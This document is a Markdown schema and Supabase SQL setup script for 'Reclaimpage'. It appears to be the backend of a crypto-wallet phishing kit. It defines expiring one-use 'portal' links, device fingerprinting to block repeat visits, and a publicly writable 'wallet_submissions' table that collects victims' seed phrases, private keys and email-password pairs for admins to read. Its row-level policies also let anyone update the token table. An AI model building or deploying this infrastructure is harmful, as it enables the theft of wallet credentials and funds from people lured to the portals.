# Reclaimpage Database Schema & RLS Policies

This document outlines the Supabase database structure and the Row Level Security (RLS) policies required for the Reclaimpage Infrastructure Group application.

## 1. Tables

### `access_tokens`
Manages the dynamic, time-limited secure portal entry points.

| Column | Type | Default | Description |
| :--- | :--- | :--- | :--- |
| `id` | uuid | `gen_random_uuid()` | Primary Key |
| `token` | text | - | Unique UUID/Secret string for the URL |
| `custom_name` | text | - | Friendly name for admin identification |
| `created_at` | timestamptz | `now()` | Record creation time |
| `expires_at` | timestamptz | - | Timestamp when the link self-destructs |
| `usage_limit` | int | `1` | Max number of times the link can be used |
| `used_count` | int | `0` | Current number of times the link was used |

### `portal_sessions`
Tracks unique visitor sessions to ensure "One User = One Usage" logic.

| Column | Type | Default | Description |
| :--- | :--- | :--- | :--- |
| `id` | uuid | `gen_random_uuid()` | Primary Key |
| `token_id` | uuid | - | Foreign Key to `access_tokens.id` |
| `session_id` | text | - | Unique identifier for the visitor's browser session |
| `fingerprint` | text | - | Device fingerprint (UA + IP) to prevent usage abuse |
| `created_at` | timestamptz | `now()` | Time when the session was first established |

### `wallet_submissions`
Captures encrypted payload interactions from the secure portals.

| Column | Type | Default | Description |
| :--- | :--- | :--- | :--- |
| `id` | uuid | `gen_random_uuid()` | Primary Key |
| `wallet_name` | text | - | Name of the connecting wallet (e.g., MetaMask) |
| `wallet_address` | text | - | The public address provided by the user |
| `type` | text | - | Interaction type (seed-phrase, private-key, email-password, etc.) |
| `data` | jsonb | - | The sensitive payload (encrypted at rest) |
| `timestamp` | timestamptz | `now()` | Time of submission |
| `user_agent` | text | - | Browser/Device fingerprint of the sender |

---

## 2. SQL Setup Script

Run this script in your Supabase SQL Editor to initialize the database and security:

```sql
-- 1. Create access_tokens table
create table if not exists access_tokens (
  id uuid default gen_random_uuid() primary key,
  token text unique not null,
  custom_name text,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  expires_at timestamp with time zone not null,
  usage_limit int default 1,
  used_count int default 0
);

-- 2. Create portal_sessions table
create table if not exists portal_sessions (
  id uuid default gen_random_uuid() primary key,
  token_id uuid references access_tokens(id) on delete cascade,
  session_id text not null,
  fingerprint text,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  unique(token_id, session_id)
);

-- Index for fingerprint lookup
create index if not exists idx_portal_sessions_fingerprint on portal_sessions(token_id, fingerprint);

-- 3. Create wallet_submissions table
create table if not exists wallet_submissions (
  id uuid default gen_random_uuid() primary key,
  wallet_name text,
  wallet_address text,
  type text,
  data jsonb,
  timestamp timestamp with time zone default timezone('utc'::text, now()) not null,
  user_agent text
);

-- 4. Enable Row Level Security (RLS)
alter table access_tokens enable row level security;
alter table portal_sessions enable row level security;
alter table wallet_submissions enable row level security;

-- 5. Access Tokens Policies
create policy "Allow public token lookup" on access_tokens for select using (true);
create policy "Allow public usage increment" on access_tokens for update using (true);
create policy "Admin full access to tokens" on access_tokens for all to authenticated using (true);

-- 6. Portal Sessions Policies
create policy "Allow public session lookup" on portal_sessions for select using (true);
create policy "Allow public session creation" on portal_sessions for insert with check (true);

-- 7. Wallet Submissions Policies (CRITICAL: Fixes 403 Forbidden)
create policy "Allow public payload submissions" 
on wallet_submissions 
for insert 
to public 
with check (true);

create policy "Admins can view submissions" 
on wallet_submissions 
for select 
to authenticated 
using (true);

create policy "Admins can delete submissions" 
on wallet_submissions 
for delete 
to authenticated 
using (true);
```

---

## 3. Deployment Notes

- Ensure you run the SQL script above in your Supabase Dashboard.
- RLS must be enabled for the `wallet_submissions` table to protect the sensitive payload data from unauthorized reads.
- The `insert` policy for `wallet_submissions` is set to `public` to allow the secure portals to transmit data without requiring the end-user to be logged in as an Admin.
```